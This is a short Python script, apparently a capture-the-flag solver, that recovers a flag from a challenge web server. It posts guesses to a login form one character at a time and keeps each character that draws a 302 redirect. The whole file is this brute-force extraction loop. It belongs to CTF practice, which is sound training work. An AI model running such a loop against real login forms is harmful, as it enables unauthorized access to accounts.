import requests

charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}"
password = "HackToday{"
url = "http://sawah.ittoday.web.id:40137/"

while(password[-1]!="}"):
  for i in charset:
    r = requests.get(url)
    payload = {'password': password+i, 'submit': 'Submit+Query'}
    r = requests.post(url, data=payload)
    if r.status_code==302:
      password+=i
      print password
